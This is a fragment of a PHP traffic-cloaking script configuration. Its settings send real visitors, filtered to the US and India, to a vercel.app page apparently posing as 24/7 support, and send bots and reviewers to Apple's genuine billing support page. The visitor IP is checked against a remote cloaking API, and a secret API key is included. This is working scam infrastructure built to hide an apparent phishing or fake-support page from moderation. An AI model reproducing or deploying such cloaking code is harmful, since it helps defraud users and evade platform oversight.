...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://fbnsuppcare247.vercel.app/';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://support.apple.com//billing';//PHP/HTML file or URL used for bots
...
$HCSET['FILTER_GEO_LIST'] = 'US, IN'; // string([2Chars country codes])
...
$HCSET['API_SECRET_KEY'] = 'v126e90990f4354551be82268225be6fcd';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v21400696522&js=false&stage='.$HCSET['stage'];
